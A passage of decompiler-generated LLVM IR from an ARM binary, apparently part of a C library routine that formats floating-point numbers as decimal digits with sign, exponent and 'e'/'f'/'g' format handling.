  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_15e38

dec_label_pc_15c6c:                               ; preds = %dec_label_pc_15c10
  store i32 %v0_15c6c, i32* @r0, align 4
  %v0_15c70 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15c70, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15c7c = fptrunc double %v2_15c6c to float
  %v2_15c7c = bitcast float %v1_15c7c to i32
  %v6_15c7c = call i32 @__aeabi_dcmplt(i32 %v2_15c7c, i32 %v0_15c70, i32 0, i32 0)
  store i32 %v6_15c7c, i32* %r0.global-to-local, align 4
  %v2_15c80 = icmp eq i32 %v6_15c7c, 0
  store i1 %v2_15c80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c80, label %dec_label_pc_15c6c..thread9_crit_edge, label %bb209

dec_label_pc_15c6c..thread9_crit_edge:            ; preds = %dec_label_pc_15c6c
  %v0_15ca0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_15c6c
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_15c88 = load i32, i32* %r6.global-to-local, align 4
  %v2_15c88 = sub i32 0, %v1_15c88
  store i32 %v2_15c88, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_15c88, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_15c6c..thread9_crit_edge, %bb209
  %v0_15ca0 = phi i32 [ %v0_15ca0.pre, %dec_label_pc_15c6c..thread9_crit_edge ], [ %v2_15c88, %bb209 ]
  %v0_15c9c = load i32, i32* %r5.global-to-local, align 4
  %v1_15c9c = sext i32 %v0_15c9c to i64
  %v2_15c9c = bitcast i64 %v1_15c9c to double
  %v9_15ca4 = fmul double %v2_15c9c, 0.000000e+00
  %v10_15ca4 = fptrunc double %v9_15ca4 to float
  %v11_15ca4 = bitcast float %v10_15ca4 to i32
  store i32 %v11_15ca4, i32* @r2, align 4
  store i32 %v0_15ca0, i32* %r3.global-to-local, align 4
  store i32 %v0_15c9c, i32* @r0, align 4
  store i32 %v0_15ca0, i32* %r1.global-to-local, align 4
  %v7_15cb8 = call i32 @__aeabi_dcmpeq(i32 %v0_15c9c, i32 %v0_15ca0, i32 %v11_15ca4, i32 %v0_15ca0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_15cb8, i32* %r0.global-to-local, align 4
  %v2_15cbc = icmp eq i32 %v7_15cb8, 0
  store i1 %v2_15cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cbc, label %dec_label_pc_15d10, label %.thread9.dec_label_pc_15cc4_crit_edge

.thread9.dec_label_pc_15cc4_crit_edge:            ; preds = %.thread9
  %v3_15cc4.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_15cc4

dec_label_pc_15cc4:                               ; preds = %bb207, %.thread9.dec_label_pc_15cc4_crit_edge
  %v3_15cc4 = phi i32 [ %v3_15cc4.pre, %.thread9.dec_label_pc_15cc4_crit_edge ], [ %arg4, %bb207 ]
  %v1_15c08.v0_15bf45 = phi i32 [ 0, %.thread9.dec_label_pc_15cc4_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_15cc4, i32* %ip.global-to-local, align 4
  %v2_15ccc = add i32 %v3_15cc4, 16
  %v3_15ccc = inttoptr i32 %v2_15ccc to i32*
  store i32 32, i32* %v3_15ccc, align 4
  %v0_15cd4 = load i32, i32* %sb.global-to-local, align 4
  %v7_15cd4 = icmp eq i32 %v0_15cd4, 96
  store i1 %v7_15cd4, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_15cd4, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_15cc4
  %v5_15ce8 = or i32 %v1_15c08.v0_15bf45, 4
  store i32 %v5_15ce8, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_15cc4, %bb210
  %v4_15cec = phi i32 [ %v5_15ce8, %bb210 ], [ 3, %dec_label_pc_15cc4 ]
  %v4_15cec.v1_15c08.v0_15bf4 = select i1 %tmp274, i32 %v4_15cec, i32 %v1_15c08.v0_15bf45
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33960), i32* %r3.global-to-local, align 4
  %v2_15d00 = add i32 %v4_15cec.v1_15c08.v0_15bf4, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33960)
  store i32 %v2_15d00, i32* %r2.global-to-local, align 4
  %v2_15d04 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_15d04, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1622c

dec_label_pc_15d10:                               ; preds = %.thread9
  %v0_15d10 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15d10, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_15d18 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15d18, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_15d20 = call i32 @__aeabi_dcmplt(i32 %v0_15d18, i32 %v0_15d10, i32 0, i32 1100470148)
  store i32 %v6_15d20, i32* %r0.global-to-local, align 4
  %v2_15d24 = icmp eq i32 %v6_15d20, 0
  store i1 %v2_15d24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d24, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_15d10
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_15d10, %bb211
  %v0_15d2c = phi i32 [ 0, %dec_label_pc_15d10 ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33936), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33936), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_15d60 = icmp eq i32 %v0_15d2c, 0
  br label %dec_label_pc_15d50

dec_label_pc_15d50:                               ; preds = %dec_label_pc_15de8.dec_label_pc_15d50_crit_edge, %bb212
  %v2_15d58 = phi i32 [ add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33936), %bb212 ], [ %v2_15d58.pre, %dec_label_pc_15de8.dec_label_pc_15d50_crit_edge ]
  %v0_15d54 = phi i32 [ 9, %bb212 ], [ %v0_15de8, %dec_label_pc_15de8.dec_label_pc_15d50_crit_edge ]
  %v2_15d98 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_15de8.dec_label_pc_15d50_crit_edge ]
  store i32 %v0_15d2c, i32* %r2.global-to-local, align 4
  %v1_15d54 = add i32 %v0_15d54, -1
  store i32 %v1_15d54, i32* %sl.global-to-local, align 4
  store i32 %v2_15d58, i32* @lr, align 4
  %v3_15d5c = mul i32 %v1_15d54, 8
  store i32 %v3_15d5c, i32* %r3.global-to-local, align 4
  store i1 %v2_15d60, i1* %cpsr_z.global-to-local, align 1
  %v0_15d64 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15d64, i32* %r0.global-to-local, align 4
  %v0_15d68 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15d68, i32* %r1.global-to-local, align 4
  %v2_15d6c = add i32 %v3_15d5c, %v2_15d58
  store i32 %v2_15d6c, i32* %ip.global-to-local, align 4
  %v1_15da8 = inttoptr i32 %v2_15d6c to i32*
  %v2_15da8 = load i32, i32* %v1_15da8, align 4
  %v3_15da8 = sext i32 %v2_15da8 to i64
  %v1_15dac = sext i32 %v0_15d64 to i64
  %v2_15dac = bitcast i64 %v1_15dac to double
  br i1 %v2_15d60, label %dec_label_pc_15da8, label %dec_label_pc_15d74

dec_label_pc_15d74:                               ; preds = %dec_label_pc_15d50
  %v8_15d78 = bitcast i64 %v3_15da8 to double
  %v9_15d78 = fmul double %v2_15dac, %v8_15d78
  %v10_15d78 = fptrunc double %v9_15d78 to float
  %v11_15d78 = bitcast float %v10_15d78 to i32
  store i32 %v11_15d78, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_15d78, i32* %r7.global-to-local, align 4
  store i32 %v0_15d68, i32* %r8.global-to-local, align 4
  %v4_15d8c = call i32 @__aeabi_dcmplt(i32 %v11_15d78, i32 %v0_15d68, i32 0, i32 1104006501)
  store i32 %v4_15d8c, i32* %r0.global-to-local, align 4
  %v2_15d90 = icmp eq i32 %v4_15d8c, 0
  store i1 %v2_15d90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d90, label %dec_label_pc_15de8, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_15d74
  %v1_15d98 = load i32, i32* %r4.global-to-local, align 4
  %v3_15d98 = sub i32 %v2_15d98, %v1_15d98
  store i32 %v3_15d98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15de0

dec_label_pc_15da8:                               ; preds = %dec_label_pc_15d50
  store i32 %v0_15d68, i32* @r1, align 4
  %v8_15db4 = bitcast i64 %v3_15da8 to double
  %v9_15db4 = fdiv double %v2_15dac, %v8_15db4
  %v10_15db4 = fptrunc double %v9_15db4 to float
  %v11_15db4 = bitcast float %v10_15db4 to i32
  store i32 %v11_15db4, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_15db4, i32* %r7.global-to-local, align 4
  store i32 %v0_15d68, i32* %r8.global-to-local, align 4
  %v4_15dc8 = call i32 @__aeabi_dcmpge(i32 %v11_15db4, i32 %v0_15d68, i32 0, i32 1100470148)
  store i32 %v4_15dc8, i32* %r0.global-to-local, align 4
  %v2_15dcc = icmp eq i32 %v4_15dc8, 0
  store i1 %v2_15dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15dcc, label %dec_label_pc_15de8, label %dec_label_pc_15dd4

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15da8
  %v1_15dd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_15dd8 = add i32 %v1_15dd8, %v2_15d98
  store i32 %v2_15dd8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15de0

dec_label_pc_15de0:                               ; preds = %.thread10, %dec_label_pc_15dd4
  %stack_var_-192.2 = phi i32 [ %v2_15dd8, %dec_label_pc_15dd4 ], [ %v3_15d98, %.thread10 ]
  %v0_15de0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15de0, i32* %r5.global-to-local, align 4
  %v0_15de4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15de4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15de8

dec_label_pc_15de8:                               ; preds = %dec_label_pc_15d74, %dec_label_pc_15da8, %dec_label_pc_15de0
  %stack_var_-192.3 = phi i32 [ %v2_15d98, %dec_label_pc_15da8 ], [ %stack_var_-192.2, %dec_label_pc_15de0 ], [ %v2_15d98, %dec_label_pc_15d74 ]
  %v0_15de8 = load i32, i32* %sl.global-to-local, align 4
  %v2_15de8 = icmp eq i32 %v0_15de8, 0
  store i1 %v2_15de8, i1* %cpsr_z.global-to-local, align 1
  %v0_15dec = load i32, i32* %r4.global-to-local, align 4
  %v3_15dec = sdiv i32 %v0_15dec, 2
  store i32 %v3_15dec, i32* %r4.global-to-local, align 4
  br i1 %v2_15de8, label %dec_label_pc_15df4, label %dec_label_pc_15de8.dec_label_pc_15d50_crit_edge

dec_label_pc_15de8.dec_label_pc_15d50_crit_edge:  ; preds = %dec_label_pc_15de8
  %v2_15d58.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_15d50

dec_label_pc_15df4:                               ; preds = %dec_label_pc_15de8
  %v0_15df4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15df4, i32* @r0, align 4
  %v0_15df8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15df8, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_15e04 = call i32 @__aeabi_dcmpge(i32 %v0_15df4, i32 %v0_15df8, i32 0, i32 1104006501)
  store i32 %v6_15e04, i32* %r0.global-to-local, align 4
  %v2_15e08 = icmp eq i32 %v6_15e04, 0
  store i1 %v2_15e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e08, label %dec_label_pc_15e38, label %dec_label_pc_15e10

dec_label_pc_15e10:                               ; preds = %dec_label_pc_15df4
  %v0_15e10 = load i32, i32* %r5.global-to-local, align 4
  %v1_15e10 = sext i32 %v0_15e10 to i64
  %v2_15e10 = bitcast i64 %v1_15e10 to double
  %v0_15e14 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15e14, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_15e20 = fdiv double %v2_15e10, 0.000000e+00
  %v10_15e20 = fptrunc double %v9_15e20 to float
  %v11_15e20 = bitcast float %v10_15e20 to i32
  store i32 %v11_15e20, i32* %r0.global-to-local, align 4
  store i32 %v11_15e20, i32* %r5.global-to-local, align 4
  %v1_15e30 = add i32 %stack_var_-192.3, 1
  store i32 %v1_15e30, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15e38

dec_label_pc_15e38:                               ; preds = %dec_label_pc_15e10, %bb208, %dec_label_pc_15df4, %dec_label_pc_15c58
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_15df4 ], [ -1, %dec_label_pc_15c58 ], [ -1, %bb208 ], [ %v1_15e30, %dec_label_pc_15e10 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_15e3c = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_15e3c, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15e40

dec_label_pc_15e40:                               ; preds = %dec_label_pc_15eb8, %dec_label_pc_15e38
  %v0_15e40 = load i32, i32* %r6.global-to-local, align 4
  %v0_15e44 = load i32, i32* %r5.global-to-local, align 4
  %v1_15e48 = sext i32 %v0_15e44 to i64
  %v2_15e48 = bitcast i64 %v1_15e48 to double
  %v3_15e48 = fptoui double %v2_15e48 to i32
  store i32 %v3_15e48, i32* %r8.global-to-local, align 4
  store i32 %v3_15e48, i32* %r2.global-to-local, align 4
  store i32 %v0_15e40, i32* %r3.global-to-local, align 4
  store i32 %v0_15e44, i32* @r0, align 4
  store i32 %v0_15e40, i32* %r1.global-to-local, align 4
  %v6_15e64 = call i32 @__aeabi_dsub(i32 %v0_15e44, i32 %v0_15e40, i32 %v3_15e48, i32 %v0_15e40)
  %v7_15e64 = sext i32 %v6_15e64 to i64
  %v8_15e64 = bitcast i64 %v7_15e64 to double
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v9_15e70 = fmul double %v8_15e64, 0.000000e+00
  %v10_15e70 = fptrunc double %v9_15e70 to float
  %v11_15e70 = bitcast float %v10_15e70 to i32
  store i32 %v11_15e70, i32* %r0.global-to-local, align 4
  %v0_15e74 = load i32, i32* %sl.global-to-local, align 4
  %v1_15e74 = add i32 %v0_15e74, 9
  store i32 %v1_15e74, i32* %sl.global-to-local, align 4
  store i32 %v11_15e70, i32* %r5.global-to-local, align 4
  store i32 %v0_15e40, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_15e84.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15e84

dec_label_pc_15e84:                               ; preds = %dec_label_pc_15e84.dec_label_pc_15e84_crit_edge, %dec_label_pc_15e40
  %v1_15e98 = phi i32 [ %v1_15e98.pre, %dec_label_pc_15e84.dec_label_pc_15e84_crit_edge ], [ %v1_15e74, %dec_label_pc_15e40 ]
  %v0_15e90 = phi i32 [ %v0_15eac, %dec_label_pc_15e84.dec_label_pc_15e84_crit_edge ], [ 0, %dec_label_pc_15e40 ]
  %v0_15e9c = phi i32 [ %v2_15ea8, %dec_label_pc_15e84.dec_label_pc_15e84_crit_edge ], [ %v0_15e84.pre, %dec_label_pc_15e40 ]
  %v3_15e8c = urem i32 %v0_15e9c, 10
  %v1_15e90 = add i32 %v0_15e90, 1
  store i32 %v1_15e90, i32* %r7.global-to-local, align 4
  %v1_15e94 = or i32 %v3_15e8c, 48
  store i32 %v1_15e94, i32* %r2.global-to-local, align 4
  %v2_15e98 = sub i32 %v1_15e98, %v1_15e90
  store i32 %v2_15e98, i32* %r3.global-to-local, align 4
  store i32 %v0_15e9c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_15ea4 = trunc i32 %v1_15e94 to i8
  %v3_15ea4 = inttoptr i32 %v2_15e98 to i8*
  store i8 %v1_15ea4, i8* %v3_15ea4, align 1
  %v0_15ea8 = load i32, i32* %r0.global-to-local, align 4
  %v1_15ea8 = load i32, i32* %r1.global-to-local, align 4
  %v2_15ea8 = udiv i32 %v0_15ea8, %v1_15ea8
  store i32 %v2_15ea8, i32* %r0.global-to-local, align 4
  %v0_15eac = load i32, i32* %r7.global-to-local, align 4
  %v7_15eac = icmp eq i32 %v0_15eac, 8
  store i1 %v7_15eac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_15ea8, i32* %r8.global-to-local, align 4
  %v7_15eb4 = icmp slt i32 %v0_15eac, 9
  br i1 %v7_15eb4, label %dec_label_pc_15e84.dec_label_pc_15e84_crit_edge, label %dec_label_pc_15eb8

dec_label_pc_15e84.dec_label_pc_15e84_crit_edge:  ; preds = %dec_label_pc_15e84
  %v1_15e98.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15e84

dec_label_pc_15eb8:                               ; preds = %dec_label_pc_15e84
  %v0_15eb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_15eb8 = add i32 %v0_15eb8, 1
  store i32 %v1_15eb8, i32* %r4.global-to-local, align 4
  %v7_15ebc = icmp eq i32 %v0_15eb8, 0
  store i1 %v7_15ebc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15ebc, label %dec_label_pc_15e40, label %dec_label_pc_15ec4

dec_label_pc_15ec4:                               ; preds = %dec_label_pc_15eb8
  %v0_15ec4 = load i32, i32* %sb.global-to-local, align 4
  %v7_15ec4 = icmp eq i32 %v0_15ec4, 96
  store i1 %v7_15ec4, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_15ec4, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_15ec4
  %v5_15ed4 = add i32 %v0_15ec4, 32
  store i32 %v5_15ed4, i32* %r3.global-to-local, align 4
  %v5_15ed8 = urem i32 %v5_15ed4, 256
  store i32 %v5_15ed8, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_15ec4
  %v4_15ed0.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_15ed0.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_15ed0126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_15ef8 = phi i32 [ %v0_15ec4, %thread-pre-split ], [ %v5_15ed8, %bb213 ]
  %v7_15edc = icmp eq i32 %v0_15ef8, 103
  %. = zext i1 %v7_15edc to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_15ee8 = load i32, i32* %fp.global-to-local, align 4
  %v2_15ee8 = icmp eq i32 %v0_15ee8, 0
  store i1 %v2_15ee8, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_15ee8, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_15ef0 = icmp eq i1 %v7_15edc, false
  store i1 %v2_15ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ef0, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_15ef4 = add i32 %v0_15ee8, -1
  store i32 %v2_15ef4, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_15f08 = phi i32 [ %v0_15ee8, %.thread16 ], [ %v0_15ee8, %bb218 ], [ %v2_15ef4, %bb219 ]
  %v7_15ef8 = icmp eq i32 %v0_15ef8, 102
  store i1 %v7_15ef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15ef8, label %dec_label_pc_15f04, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_15f08, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15f2c

dec_label_pc_15f04:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_15f08 = add i32 %v0_15f08, %stack_var_-192.4
  store i32 %v2_15f08, i32* %ip.global-to-local, align 4
  %v8_15f0c = icmp eq i32 %v2_15f08, -1
  store i1 %v8_15f0c, i1* %cpsr_z.global-to-local, align 1
  %v6_15f10 = icmp slt i32 %v2_15f08, -1
  br i1 %v6_15f10, label %dec_label_pc_15f14, label %dec_label_pc_15f2c

dec_label_pc_15f14:                               ; preds = %dec_label_pc_15f04
  %v2_15f14 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_15f14, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_15f20 = bitcast i32* %stack_var_-83 to i8*
  %v4_15f20 = call i32 @__GI_memset(i8* %v3_15f20, i32 48, i32 17)
  store i32 %v4_15f20, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15f2c

dec_label_pc_15f2c:                               ; preds = %bb221, %dec_label_pc_15f04, %dec_label_pc_15f14
  %v1_15f7092 = phi i32 [ %v4_15f20, %dec_label_pc_15f14 ], [ %v2_15ea8, %dec_label_pc_15f04 ], [ %v2_15ea8, %bb221 ]
  %v1_15f54 = phi i32 [ -1, %dec_label_pc_15f14 ], [ %v2_15f08, %dec_label_pc_15f04 ], [ %v0_15f08, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_15f14 ], [ %stack_var_-192.4, %dec_label_pc_15f04 ], [ %stack_var_-192.4, %bb221 ]
  %v1_15f30 = add i32 %v1_15f54, -16
  %v3_15f30 = sub i32 15, %v1_15f54
  %v4_15f30 = and i32 %v3_15f30, %v1_15f54
  %v5_15f30 = icmp slt i32 %v4_15f30, 0
  %v6_15f30 = icmp slt i32 %v1_15f30, 0
  %v7_15f30 = icmp eq i32 %v1_15f54, 16
  store i1 %v7_15f30, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_15f3c = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_15f3c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_15f44 = xor i1 %v6_15f30, %v5_15f30
  %v4_15f44 = or i1 %v7_15f30, %v3_15f44
  br i1 %v4_15f44, label %dec_label_pc_15f50, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_15f2c
  %v7_15f44137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_15f44137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_15f50:                               ; preds = %dec_label_pc_15f2c
  %v2_15f50 = ptrtoint i32* %stack_var_-82 to i32
  %v2_15f54 = add i32 %v1_15f54, %v2_15f50
  store i32 %v2_15f54, i32* %r3.global-to-local, align 4
  %v1_15f58 = add i32 %v2_15f54, 2
  %v2_15f58 = inttoptr i32 %v1_15f58 to i8*
  %v3_15f58 = load i8, i8* %v2_15f58, align 1
  %v4_15f58 = zext i8 %v3_15f58 to i32
  store i32 %v4_15f58, i32* %r2.global-to-local, align 4
  store i32 %v1_15f58, i32* %r1.global-to-local, align 4
  %v2_15f60 = icmp ugt i8 %v3_15f58, 51
  %v7_15f60 = icmp eq i8 %v3_15f58, 52
  store i1 %v7_15f60, i1* %cpsr_z.global-to-local, align 1
  %v2_15f64 = xor i1 %v2_15f60, true
  %v3_15f64 = or i1 %v7_15f60, %v2_15f64
  br i1 %v3_15f64, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_15f50
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_15f50, %bb222
  %v1_15f7090 = phi i32 [ %v1_15f7092, %dec_label_pc_15f50 ], [ 0, %bb222 ]
  %v2_15f68 = xor i1 %v7_15f60, true
  %v3_15f68 = and i1 %v2_15f60, %v2_15f68
  br i1 %v3_15f68, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_15f6c = phi i32 [ %v0_15f6c.pre, %._crit_edge87 ], [ %v7_15f44137141, %.thread140 ], [ %v1_15f58, %bb223 ], [ %v1_15f58, %bb224 ]
  %v1_15f70 = phi i32 [ %v1_15f70.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_15f7090, %bb223 ], [ 1, %bb224 ]
  %v1_15f6c = add i32 %v0_15f6c, -1
  %v2_15f6c = inttoptr i32 %v1_15f6c to i8*
  %v3_15f6c = load i8, i8* %v2_15f6c, align 1
  %v4_15f6c = zext i8 %v3_15f6c to i32
  store i32 %v1_15f6c, i32* %r1.global-to-local, align 4
  %v2_15f70 = add i32 %v4_15f6c, %v1_15f70
  %v1_15f74 = urem i32 %v2_15f70, 256
  store i32 %v1_15f74, i32* %r3.global-to-local, align 4
  %v2_15f78 = icmp ugt i32 %v1_15f74, 56
  %v7_15f78 = icmp eq i32 %v1_15f74, 57
  store i1 %v7_15f78, i1* %cpsr_z.global-to-local, align 1
  %v2_15f7c = xor i1 %v2_15f78, true
  %v3_15f7c = or i1 %v7_15f78, %v2_15f7c
  br i1 %v3_15f7c, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_15f80 = xor i1 %v7_15f78, true
  %v3_15f80 = and i1 %v2_15f78, %v2_15f80
  br i1 %v3_15f80, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_15f88.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_15f88 = phi i32 [ %v1_15f88.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_15f84 = icmp eq i32 %v1_15f74, 48
  store i1 %v7_15f84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15f84, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_15f88 = or i32 %v1_15f88, 1
  store i32 %v2_15f88, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_15f8c = phi i32 [ 1, %bb229 ], [ %v1_15f88, %bb228 ]
  %v2_15f8c = icmp eq i32 %v0_15f8c, 0
  store i1 %v2_15f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_15f90 = trunc i32 %v2_15f70 to i8
  store i8 %v1_15f90, i8* %v2_15f6c, align 1
  %v0_15f94 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15f94, label %dec_label_pc_15f98, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_15f70.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_15f6c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_15f98:                               ; preds = %._crit_edge93
  store i32 %v2_15f3c, i32* %r2.global-to-local, align 4
  %v2_15f9c = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_15f9c, i32* %r3.global-to-local, align 4
  %v0_15fa0 = load i32, i32* %r1.global-to-local, align 4
  %v3_15fa0 = icmp uge i32 %v0_15fa0, %v2_15f9c
  %v9_15fa0 = icmp eq i32 %v0_15fa0, %v2_15f9c
  store i1 %v9_15fa0, i1* %cpsr_z.global-to-local, align 1
  %v2_15fa4 = xor i1 %v3_15fa0, true
  %v3_15fa4 = or i1 %v9_15fa0, %v2_15fa4
  br i1 %v3_15fa4, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_15f98
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_15f9c, i32* %r2.global-to-local, align 4
  store i32 %v2_15f9c, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_15f98, %bb230
  %v2_15fc4 = phi i32 [ %v2_15f9c, %bb230 ], [ %v0_15fa0, %dec_label_pc_15f98 ]
